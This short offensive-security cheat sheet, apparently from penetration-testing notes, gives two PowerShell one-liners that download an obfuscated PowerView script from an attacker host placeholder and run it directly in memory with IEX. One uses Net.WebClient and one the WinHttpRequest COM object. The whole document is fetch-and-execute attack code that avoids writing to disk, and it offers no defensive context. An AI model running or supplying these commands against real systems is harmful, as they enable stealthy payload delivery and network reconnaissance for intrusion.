# Load Directly Into Memory (Reflective One-Liners)

### 1) Proxy-aware

    IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/PowerView.obs.ps1')

### 2) Non-proxy aware

    $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://[ATTACKER_IP]/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
